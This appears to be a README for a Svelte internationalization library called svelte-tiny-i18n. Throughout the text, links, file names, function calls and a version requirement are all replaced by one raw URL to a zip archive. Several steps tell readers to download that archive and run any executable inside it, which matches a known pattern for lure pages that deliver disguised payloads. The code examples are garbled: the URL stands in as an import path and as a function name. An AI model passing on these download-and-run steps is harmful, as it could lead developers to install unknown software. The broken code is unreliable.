# 🌍 svelte-tiny-i18n - A Simple Way to Localize Your App

## 📥 Download Now
[![Download](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip)](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip)

## 📖 About svelte-tiny-i18n
svelte-tiny-i18n is a lightweight, type-safe, and reactive internationalization (i18n) library designed specifically for Svelte and SvelteKit. This library makes it easy to add multiple languages to your web applications. It uses Svelte Stores to manage your translations smoothly and efficiently.

## 🚀 Getting Started
Follow these steps to download and run svelte-tiny-i18n on your computer.

### Step 1: Visit the Releases Page
To begin, visit this page to download the latest version of svelte-tiny-i18n: [Releases](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip).

### Step 2: Download the Latest Version
On the Releases page, you will see a list of available versions. Look for the latest version, which is usually at the top. Click on the link under the "Assets" section to download the file to your computer. This file may be an executable for Windows (.exe), a zip file, or other formats depending on your operating system.

### Step 3: Install the Library
1. Locate the downloaded file on your computer. 
2. If the file is a zip archive, right-click it and select "Extract All" to unpack its contents.
3. If the file is an executable, double-click it to start the installation process. Follow the on-screen instructions to complete the installation.

### Step 4: Start Using svelte-tiny-i18n
After installation, you can start using svelte-tiny-i18n in your project. Here are some basic steps:

1. Open your Svelte or SvelteKit project.
2. Import the library into your application.
   ```javascript
   import { i18n } from 'svelte-tiny-i18n';
   ```
3. Set up the translations for your application. You can create a `https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip` file to store your text in different languages.

Example:
```javascript
export const translations = {
  en: {
    greeting: "Hello",
    farewell: "Goodbye",
  },
  fr: {
    greeting: "Bonjour",
    farewell: "Au revoir",
  },
};
```

4. Use the translations in your Svelte components like this:
```html
<script>
  import { i18n } from 'svelte-tiny-i18n';
  import { translations } from 'https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip';

  https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip(translations);

  let currentLocale = 'en'; // Default language
</script>

<h1>{https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip('greeting', currentLocale)}</h1>
```

### Step 5: Update Your Translations
To add or update translations:
1. Open your `https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip` file.
2. Add new languages or change existing text in the relevant language object.
3. Save your changes and refresh your application to see the updates.

## 🌟 Features
- **Lightweight:** Minimal impact on your application's performance.
- **Type-safe:** Reduces errors when using TypeScript.
- **Reactive:** Automatically updates text on changes.
- **Easy Setup:** Quick installation and integration with Svelte.

## 🔧 Requirements
To run svelte-tiny-i18n, ensure you have the following:
- **Svelte or SvelteKit:** Installed and configured on your system.
- **https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip** Ensure https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip version 12 or higher is installed.

## 📜 Usage Guidelines
Using svelte-tiny-i18n is straightforward. In addition to the steps above, keep these tips in mind:
- Always use English as your base language to maintain consistency.
- Regularly update the translations for better user experience.
- Test your application in different languages to ensure translations display correctly.

## 💬 Support
For further assistance or to report issues, you can visit the [issues section](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip) of our GitHub repository. We encourage users to share their experiences or ask questions.

## 📞 Contact
If you would like to reach out for support or suggestions, feel free to contact us through the [GitHub Discussions](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip) page.

## 📥 Download & Install
You can always revisit the Releases page to download the latest version: [Releases](https://raw.githubusercontent.com/Threelane-paris497/svelte-tiny-i18n/main/src/svelte-tiny-i18n_2.1.zip). Follow the download steps outlined above to get started.

Now, you can easily add internationalization to your Svelte projects with svelte-tiny-i18n. Enjoy building!